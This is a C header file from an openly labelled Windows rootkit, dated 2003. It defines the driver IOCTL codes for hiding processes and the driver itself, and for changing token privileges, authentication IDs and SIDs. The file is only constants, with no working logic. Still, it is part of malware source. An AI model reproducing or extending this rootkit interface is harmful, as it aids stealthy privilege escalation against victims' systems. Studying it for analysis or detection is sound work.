///////////////////////////////////////////////////////////////////////////////////////
// Filename ioctlcmd.h
// 
// Author: fuzen_op
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: Defines the IOCTL's used by the driver and the controlling DLL.
//
// Date:    5/27/2003
// Version: 1.0

#define FILE_DEVICE_ROOTKIT      0x00002a7b

#define IOCTL_ROOTKIT_HIDEME          (ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT, 0x02, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_ROOTKIT_SETPRIV         (ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT, 0x05, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_ROOTKIT_SETAUTHID       (ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT, 0x04, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_ROOTKIT_SETSID          (ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT, 0x06, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_ROOTKIT_HIDEDRIV        (ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT, 0x08, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_ROOTKIT_HIDE_NONGUI     (ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT, 0x0C, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_TRANSFER_TYPE( _iocontrol)   (_iocontrol & 0x3)

